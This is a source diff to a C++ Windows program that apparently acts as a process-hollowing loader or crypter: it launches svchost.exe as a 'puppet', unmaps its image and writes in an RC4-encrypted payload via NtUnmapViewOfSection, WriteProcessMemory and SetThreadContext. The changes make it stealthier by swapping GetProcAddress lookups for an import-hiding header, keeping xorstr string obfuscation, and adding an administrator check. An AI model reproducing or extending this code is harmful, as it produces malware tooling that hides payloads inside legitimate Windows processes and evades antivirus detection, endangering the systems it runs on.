@@ -9,6 +9,7 @@
 #include <functional>
 #include "xorstr.hpp"
 #include "rc4.h"
+#include "importer.h"
 
 namespace fs = std::filesystem;
 std::string puppet_path = xorstr_("C:\\Windows\\System32\\svchost.exe");
@@ -18,10 +19,6 @@ unsigned char rc4_key[16] = {
 
 using PEB_ptr = std::unique_ptr<PEB>;
 
-#define quick_import_function(module_name, function) \
-using function##_t = decltype(function); \
-function##_t* function = (function##_t*)GetProcAddress(GetModuleHandleA(module_name), xorstr_(#function)); \
-assert(function != NULL);
 
 enum LOG_LEVEL
 {
@@ -55,10 +52,8 @@ static inline void eprintln(const char* fmt, ...)
 
 static PEB_ptr read_peb(HANDLE process)
 {
-  char szntdll[] = {'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', '\0'};
-  char szkernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', '\0' };
-  quick_import_function(szntdll, NtQueryInformationProcess);
-  quick_import_function(szkernel32, ReadProcessMemory);
+  quick_import_function(L"ntdll.dll", NtQueryInformationProcess);
+  quick_import_function(L"kernel32.dll", ReadProcessMemory);
   PROCESS_BASIC_INFORMATION basicInfo = { 0 };
   DWORD dwReturnLength = 0;
   NTSTATUS status = 0;
@@ -88,7 +83,7 @@ static std::vector<uint8_t> read_binaray_file(const std::string& path)
   data.resize( ifs.tellg());
   ifs.seekg(0, std::ios::beg);
 
-  ifs.read(reinterpret_cast<char*> (data.data()), data.size());
+  ifs.read(reinterpret_cast<char*> (data.data()), (std::streamsize)data.size());
   return data;
 }
 
@@ -98,7 +93,7 @@ static bool write_binaray_file(const std::string& path, const std::vector<uint8_
   if (!ofs.is_open())
     return false;
 
-  ofs.write(reinterpret_cast<const char*>(data.data()), data.size());
+  ofs.write(reinterpret_cast<const char*>(data.data()), (std::streamsize)data.size());
   return true;
 }
 
@@ -147,19 +142,39 @@ static std::string get_defualt_encrypt_file_name(const fs::path& inputpath)
   return newpath.string();
 }
 
+static bool IsRunAsAdmin() {
+  BOOL isAdmin = FALSE;
+  PSID adminGroup = NULL;
+
+  // SID for the administrators group
+  SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
+  if (AllocateAndInitializeSid(
+    &NtAuthority,
+    2,
+    SECURITY_BUILTIN_DOMAIN_RID,
+    DOMAIN_ALIAS_RID_ADMINS,
+    0, 0, 0, 0, 0, 0,
+    &adminGroup))
+  {
+    // Check if the token of the current process contains admin group SID
+    CheckTokenMembership(NULL, adminGroup, &isAdmin);
+    FreeSid(adminGroup);
+  }
+
+  return isAdmin == TRUE;
+}
+
 int main(int argc, char* argv[])
 {
-  char szntdll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', '\0' };
-  char szkernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', '\0' };
-  quick_import_function(szntdll, NtUnmapViewOfSection);
-  quick_import_function(szkernel32, CreateProcessA);
-  quick_import_function(szkernel32, VirtualAllocEx);
-  quick_import_function(szkernel32, WriteProcessMemory);
-  quick_import_function(szkernel32, ReadProcessMemory);
-  quick_import_function(szkernel32, ResumeThread);
-  quick_import_function(szkernel32, VirtualProtectEx);
-  quick_import_function(szkernel32, GetThreadContext);
-  quick_import_function(szkernel32, SetThreadContext);
+  quick_import_function(L"ntdll.dll", NtUnmapViewOfSection);
+  quick_import_function(L"kernel32.dll", CreateProcessA);
+  quick_import_function(L"kernel32.dll", VirtualAllocEx);
+  quick_import_function(L"kernel32.dll", WriteProcessMemory);
+  quick_import_function(L"kernel32.dll", ReadProcessMemory);
+  quick_import_function(L"kernel32.dll", ResumeThread);
+  quick_import_function(L"kernel32.dll", VirtualProtectEx);
+  quick_import_function(L"kernel32.dll", GetThreadContext);
+  quick_import_function(L"kernel32.dll", SetThreadContext);
   NTSTATUS status =  0;
   bool success = false;
 
@@ -201,6 +216,11 @@ int main(int argc, char* argv[])
     }
     iprintln("success");
     return 0;
+  }
+  if (!IsRunAsAdmin())
+  {
+    eprintln(xorstr_("Must be run as administrator"));
+    return 1;
   }
 
   std::string source_path(argv[1]);
@@ -394,5 +414,6 @@ int main(int argc, char* argv[])
 
   iprintln("success");
   success = true;
+  getchar();
   return 0;
 }
